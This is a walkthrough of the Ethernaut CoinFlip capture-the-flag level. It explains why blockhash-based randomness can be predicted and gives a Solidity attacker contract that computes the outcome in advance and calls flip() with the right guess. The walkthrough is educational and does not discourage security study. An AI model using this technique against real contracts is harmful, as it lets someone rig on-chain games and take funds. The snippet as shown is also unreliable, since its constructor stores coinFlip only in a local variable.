## Welcome to KweenBirb's 4th installment of Ethernaut walkthroughs! 

Ethernaut is a set of gamified Solidity challenges in the style of a CTF, where each level features a hackable smart contract that will inform you of various known security vulnerabilities on EVM blockchains.

This repo will walk you through a solution to the 4_CoinFlip.sol challenge. You can find the challenge itself and fully fleshed out solution in the .txt and .sol files in this directory. Let's begin!

OpenZeppelin instructs us that this contract 'is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.'

This must mean that the randomness generation is broken or circumventable!

Begin by observing that there are two variables used that are globally available on-chain:

```blockhash```

```block.number```

This should be a major red flag if they are used in random number generation as, like nearly everything on-chain they are transparent and publicly available.

Looking more closely at the flip() function, we note that these variables are indeed used to generate and return a boolean!

```uint256 blockValue = uint256(blockhash(block.number.sub(1)));```

The line above grabs the hash of the previous block. 

This value, blockValue, is then checked against a value in storage called lastHash, presumably reverting execution to prevent multiple flip function calls in the same (current) block. Yep, the next variable change in line 30 confirms this to us:

```lastHash = blockValue;```

Next we note that the blockValue variable is divided by another value in storage, in this case a uint called FACTOR. This result, named coinFlip, is then used to determine the outcome of the flip function. It does so by checking if coinFlip is equal to 1:

```
if (side == _guess) {
    consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
```

Now that we know the general architecture of the boolean generation, we should know enough to investigate FACTOR.  It is quite a large number, and it must have some significance as it is the divisor that causes blockValue to be changed into a value that either matches or does not match 1.

### L33tH4xzor tiem bayB!

Regardless if you discover FACTOR's importance at this point, any random number generation in the open source and that doesn't use cryptography is reversible.

Time to put our hacker hoodies and 8bit sunglasses on to break the level, start with the CoinFlip interface: 

```interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}
```
Now that we can interact with the Ethernaut contract, let's instantiate it in our own malicious contract:

```contract Cassandra {
    constructor(address $your_ethernaut_instance_here) {
        CoinFlip coinFlip = CoinFlip($your_ethernaut_instance_here);
        }
    }
```

Obviously you'll deploy your attacker contract with your Ethernaut instance as parameter.

Then we create a function to psychically predict each outcome before it happens! ...Psychics do this by using arithmetic with massive numbers, right!?

Simply reverse the original outcome generation:

```function predict() public {
        uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue = uint256(blockhash(block.number - 1));
        if (blockValue / factor == 1) {
            coinFlip.flip(true);
        } else {
            coinFlip.flip(false);
        }
    }
```

You'll note that we're no longer using the OZ SafeMath library here as I wrote this in Solidity 0.8.0, which largely deprecated that library.

Once you've deployed your contract, call this function 10 times (once per new block) to defeat this level's randomness.

Congratulations!

*** PS. If you haven't yet figured out the significance of the variable FACTOR, look into how Solidity handles truncation and rounding as well as the value of FACTOR * 2

h00t h00t
